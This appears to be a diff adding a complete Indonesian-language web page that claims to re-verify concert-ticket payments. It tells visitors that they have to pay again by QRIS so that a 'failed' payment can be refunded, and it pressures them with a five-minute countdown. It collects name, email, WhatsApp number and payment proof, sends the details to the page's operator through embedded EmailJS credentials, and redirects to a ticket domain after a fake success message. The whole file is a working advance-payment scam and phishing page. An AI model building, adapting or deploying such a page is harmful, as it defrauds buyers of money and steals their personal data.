@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>VERIFIKASI PEMBAYARAN ULANG</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:#050505;
+color:white;
+overflow-x:hidden;
+min-height:100vh;
+padding:20px;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.bg{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:
+linear-gradient(rgba(0,0,0,0.75),rgba(0,0,0,0.75)),
+url('banner.jpg') center/cover;
+filter:blur(8px);
+transform:scale(1.1);
+z-index:-2;
+}
+
+.glow{
+position:fixed;
+width:400px;
+height:400px;
+background:red;
+border-radius:50%;
+filter:blur(150px);
+opacity:0.25;
+animation:moveGlow 10s infinite alternate;
+z-index:-1;
+}
+
+@keyframes moveGlow{
+0%{
+transform:translate(-100px,-100px);
+}
+100%{
+transform:translate(200px,200px);
+}
+}
+
+.container{
+width:100%;
+max-width:500px;
+background:rgba(10,10,10,0.96);
+border:1px solid rgba(255,0,0,0.4);
+border-radius:30px;
+overflow:hidden;
+box-shadow:0 0 50px rgba(255,0,0,0.35);
+animation:fadeIn 1s ease;
+}
+
+.banner{
+width:100%;
+display:block;
+}
+
+.content{
+padding:25px;
+}
+
+.title{
+font-size:28px;
+font-weight:bold;
+text-align:center;
+margin-bottom:10px;
+color:#ff2d2d;
+text-shadow:0 0 20px red;
+}
+
+.desc{
+text-align:center;
+font-size:14px;
+color:#ddd;
+line-height:1.7;
+margin-bottom:20px;
+}
+
+.input{
+width:100%;
+padding:16px;
+border:none;
+border-radius:15px;
+background:#171717;
+color:white;
+font-size:15px;
+margin-bottom:15px;
+outline:none;
+border:1px solid rgba(255,255,255,0.06);
+}
+
+select.input{
+appearance:none;
+}
+
+.upload-box{
+background:#101010;
+padding:15px;
+border-radius:18px;
+margin-bottom:15px;
+border:1px solid rgba(255,255,255,0.08);
+}
+
+.upload-box label{
+display:block;
+margin-bottom:10px;
+font-size:14px;
+color:#ccc;
+}
+
+.timer{
+background:#141414;
+padding:18px;
+border-radius:18px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+margin-bottom:20px;
+color:#FFD700;
+box-shadow:0 0 20px rgba(255,215,0,0.2);
+}
+
+.total{
+background:linear-gradient(45deg,#ff0000,#ff5e00);
+padding:18px;
+border-radius:20px;
+text-align:center;
+font-size:22px;
+font-weight:bold;
+margin-bottom:20px;
+box-shadow:0 0 30px rgba(255,0,0,0.4);
+}
+
+.qris-box{
+display:none;
+background:#0f0f0f;
+border-radius:25px;
+padding:20px;
+margin-bottom:20px;
+border:1px solid rgba(255,255,255,0.08);
+animation:fadeIn 1s ease;
+}
+
+.qris-box h3{
+text-align:center;
+margin-bottom:15px;
+color:#FFD700;
+}
+
+.qris-box p{
+font-size:14px;
+line-height:1.7;
+color:#ddd;
+text-align:center;
+margin-bottom:15px;
+}
+
+.qris{
+width:100%;
+border-radius:20px;
+border:3px solid red;
+box-shadow:0 0 25px rgba(255,0,0,0.4);
+}
+
+.btn{
+width:100%;
+padding:18px;
+border:none;
+border-radius:18px;
+background:linear-gradient(45deg,#ff0000,#ff6600);
+color:white;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+transition:0.4s;
+opacity:0.5;
+pointer-events:none;
+box-shadow:0 0 30px rgba(255,0,0,0.4);
+}
+
+.btn.active{
+opacity:1;
+pointer-events:auto;
+}
+
+.btn:hover{
+transform:scale(1.03);
+}
+
+.loading{
+display:none;
+text-align:center;
+margin-top:20px;
+font-size:15px;
+color:#FFD700;
+animation:pulse 1s infinite;
+}
+
+.success{
+display:none;
+text-align:center;
+padding:30px;
+animation:fadeIn 1s ease;
+}
+
+.success h2{
+color:#00ff88;
+margin-bottom:15px;
+font-size:28px;
+}
+
+.success p{
+line-height:1.8;
+color:#ddd;
+}
+
+@keyframes pulse{
+0%{opacity:0.5;}
+50%{opacity:1;}
+100%{opacity:0.5;}
+}
+
+@keyframes fadeIn{
+from{
+opacity:0;
+transform:translateY(30px);
+}
+to{
+opacity:1;
+transform:translateY(0);
+}
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+<div class="glow"></div>
+
+<div class="container">
+
+<img src="banner.jpg" class="banner">
+
+<div class="content" id="formBox">
+
+<div class="title">
+VERIFIKASI PEMBAYARAN ULANG
+</div>
+
+<div class="desc">
+Silahkan lakukan verifikasi pembayaran ulang agar saldo yang telah terpotong dapat diproses refund otomatis.
+</div>
+
+<input type="text" id="nama" class="input" placeholder="Nama Lengkap">
+
+<input type="email" id="email" class="input" placeholder="E-mail Aktif">
+
+<input type="number" id="wa" class="input" placeholder="No. WhatsApp">
+
+<select id="kategori" class="input" onchange="updateTotal()">
+<option value="">Pilih Category Tiket</option>
+<option value="2750000">VIP PACKAGE - Rp. 2.750.000</option>
+<option value="2500000">CAT 1A & B - Rp. 2.500.000</option>
+<option value="2250000">CAT 2 A&B - Rp. 2.250.000</option>
+<option value="1850000">CAT 3 A&B - Rp. 1.850.000</option>
+<option value="1450000">CAT 4 A&B - Rp. 1.450.000</option>
+<option value="1250000">CAT 5 A&B - Rp. 1.250.000</option>
+<option value="850000">CAT 6 A&B - Rp. 850.000</option>
+</select>
+
+<select id="jumlah" class="input" onchange="updateTotal()">
+<option value="">Jumlah Tiket</option>
+<option value="1">1 Tiket</option>
+<option value="2">2 Tiket</option>
+<option value="3">3 Tiket</option>
+<option value="4">4 Tiket</option>
+<option value="5">5 Tiket</option>
+</select>
+
+<div class="timer">
+Batas Waktu Pembayaran Ulang :
+<br><br>
+<span id="countdown">05:00</span>
+</div>
+
+<div class="total" id="total">
+TOTAL PEMBAYARAN ULANG : Rp 0
+</div>
+
+<div class="qris-box" id="qrisBox">
+
+<h3>PEMBAYARAN QRIS</h3>
+
+<p>
+Silahkan lakukan pembayaran ulang agar saldo yang telah terpotong dapat direfund dan kembali otomatis.
+</p>
+
+<img src="qris-pembayaran.png" class="qris">
+
+</div>
+
+<div class="upload-box">
+<label>Upload Bukti Pembayaran Failed</label>
+<input type="file" id="failed" class="input">
+</div>
+
+<div class="upload-box">
+<label>Upload Bukti Pembayaran Ulang</label>
+<input type="file" id="ulang" class="input">
+</div>
+
+<button class="btn" id="btn" onclick="kirimData()">
+VERIFIKASI PEMBAYARAN
+</button>
+
+<div class="loading" id="loading">
+Memverifikasi pembayaran ulang...
+</div>
+
+</div>
+
+<div class="success" id="successBox">
+
+<h2>PEMBAYARAN BERHASIL</h2>
+
+<p>
+E-ticket akan dikonfirmasi melalui e-mail.<br><br>
+
+Silahkan ajukan refund untuk saldo yang telah failed.<br><br>
+
+Redirect otomatis...
+</p>
+
+</div>
+
+</div>
+
+<script>
+
+emailjs.init("4xVw4LRaVL7_wqucZ");
+
+const inputs = document.querySelectorAll("input, select");
+
+inputs.forEach(input=>{
+input.addEventListener("input",cekForm);
+input.addEventListener("change",cekForm);
+});
+
+function cekForm(){
+
+const nama=document.getElementById("nama").value;
+const email=document.getElementById("email").value;
+const wa=document.getElementById("wa").value;
+const kategori=document.getElementById("kategori").value;
+const jumlah=document.getElementById("jumlah").value;
+const failed=document.getElementById("failed").value;
+const ulang=document.getElementById("ulang").value;
+
+if(
+nama &&
+email &&
+wa &&
+kategori &&
+jumlah &&
+failed &&
+ulang
+){
+document.getElementById("btn").classList.add("active");
+}else{
+document.getElementById("btn").classList.remove("active");
+}
+
+}
+
+function updateTotal(){
+
+const kategori=parseInt(document.getElementById("kategori").value)||0;
+const jumlah=parseInt(document.getElementById("jumlah").value)||0;
+
+const total=kategori*jumlah;
+
+document.getElementById("total").innerHTML=
+"TOTAL PEMBAYARAN ULANG : Rp "+
+total.toLocaleString("id-ID");
+
+if(jumlah>0){
+document.getElementById("qrisBox").style.display="block";
+}
+
+}
+
+function kirimData(){
+
+document.getElementById("loading").style.display="block";
+
+const nama=document.getElementById("nama").value;
+const email=document.getElementById("email").value;
+const wa=document.getElementById("wa").value;
+const kategori=document.getElementById("kategori").options[document.getElementById("kategori").selectedIndex].text;
+const jumlah=document.getElementById("jumlah").value;
+const total=document.getElementById("total").innerText;
+
+emailjs.send(
+"service_gmmgawg",
+"template_rgb55jj",
+{
+user_name:nama,
+user_email:email,
+user_whatsapp:wa,
+ticket_category:kategori,
+ticket_qty:jumlah,
+payment_total:total
+}
+)
+
+.then(function(response){
+
+setTimeout(()=>{
+
+document.getElementById("formBox").style.display="none";
+document.getElementById("successBox").style.display="block";
+
+setTimeout(()=>{
+
+window.location.href="https://www.tiket.westlife.online";
+
+},3000);
+
+},30000);
+
+})
+
+.catch(function(error){
+
+alert("Gagal mengirim verifikasi");
+
+});
+
+}
+
+let time=300;
+
+const countdown=setInterval(()=>{
+
+let minutes=Math.floor(time/60);
+let seconds=time%60;
+
+if(seconds<10){
+seconds="0"+seconds;
+}
+
+document.getElementById("countdown").innerHTML=
+minutes+":"+seconds;
+
+time--;
+
+if(time<0){
+
+clearInterval(countdown);
+
+document.getElementById("countdown").innerHTML=
+"WAKTU HABIS";
+
+}
+
+},1000);
+
+</script>
+
+</body>
+</html>
